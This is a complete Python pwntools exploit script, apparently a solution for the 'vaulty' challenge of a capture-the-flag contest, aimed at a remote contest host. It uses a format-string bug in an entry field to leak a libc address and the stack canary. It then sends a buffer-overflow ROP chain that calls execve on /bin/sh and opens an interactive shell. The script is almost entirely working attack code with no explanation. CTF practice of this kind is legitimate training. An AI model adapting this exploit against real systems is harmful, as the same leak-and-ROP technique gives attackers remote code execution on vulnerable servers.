from pwn import *

# Exploit configs
print("Loading ELF...")

binary = ELF('./vaulty')
host = 'vaulty.insomnihack.ch'
port = 4556
local_libc = ELF('./libc.so.6', checksec=False)
remote_libc = ELF('./libc.so.6', checksec=False)
#ld = ELF('./ld-2.35.so', checksec=False)

print('')

def launch_gdb(breakpoints=[], cmds=[]):
    if args.TRACE:
        info("Attaching Debugger")
        cmds.append('handle SIGALRM ignore')
        cmds.append('set follow-fork-mode parent')
        for b in breakpoints:
            cmds.insert(0,'b *' + str(b))
        gdb.attach(io, gdbscript='\n'.join(cmds))
        return
    else:
        return

def create(name, password, url):
    io.sendline(b'1')
    io.sendline(name)
    io.sendline(password)
    io.sendline(url)
    
def modify(index, name, password, url):
    io.sendline(b'2')
    io.sendline(index)
    io.sendline(name)
    io.sendline(password)
    io.sendline(url)

def print_entry(index):
    io.sendline(b'4')
    io.sendlineafter(b'Select an entry to view', index)
    ret = io.recvuntil(b'Vault Menu:')
    return get_addr(ret)

def get_addr(data):
    start_index = data.find(b'0x')
    end_index = data.find(b'\n', start_index)
    result = data[start_index:end_index].decode('utf-8')
    return int(result, 16)
    
if args.REMOTE:
    args.TRACE = False
    io = remote(host, port)
    libc = remote_libc
else:
    io = process(binary.path)
    libc = local_libc

b = ['0x555555555904']    
c = ['info registers']


#libc6_2.35-0ubuntu3.1_amd64
#libc6_2.35-0ubuntu3.2_amd64
#libc6_2.35-0ubuntu3.3_amd64

#GLIBC-3.35
offset_libc_main_ret = 0x029d90	
offset_libc_system = 0x050d70 	
offset_binsh =  	0x1d8678
offset_exec = 0xeb080

offset_pop_rdi = 0x2a3e5
offset_pop_rsi = 0x2be51
offset_pop_rdx = 0x11f0f7

io.recvuntil(b'Enter your choice (1-5):')
create(b'a', b'a', b'%141$p')

io.recvuntil(b'Enter your choice (1-5):')
libc_main_ret = print_entry(b'0')
libc_base = libc_main_ret - offset_libc_main_ret
system_addr = libc_base + offset_libc_system
pop_rdi = libc_base + offset_pop_rdi
pop_rsi = libc_base + offset_pop_rsi
pop_rdx = libc_base + offset_pop_rdx
bin_sh = libc_base + offset_binsh
exec_addr = libc_base + offset_exec

io.recvuntil(b'Enter your choice (1-5):')
modify(b'0', b'a', b'a', b'%139$p')

io.recvuntil(b'Enter your choice (1-5):')
canary = print_entry(b'0')

#p = b'a'*0x398 + p64(canary) + p64(1) + p64(pop_rdi) + p64(bin_sh) +  p64(pop_rdi + 0x1) + p64(system_addr)
p = b'a'*0x398 + p64(canary) + p64(1) + p64(pop_rdi) + p64(bin_sh) +  p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(0) + p64(exec_addr)

io.recvuntil(b'Enter your choice (1-5):')
modify(b'0', b'a', b'a', p)

io.interactive()
    
    
    
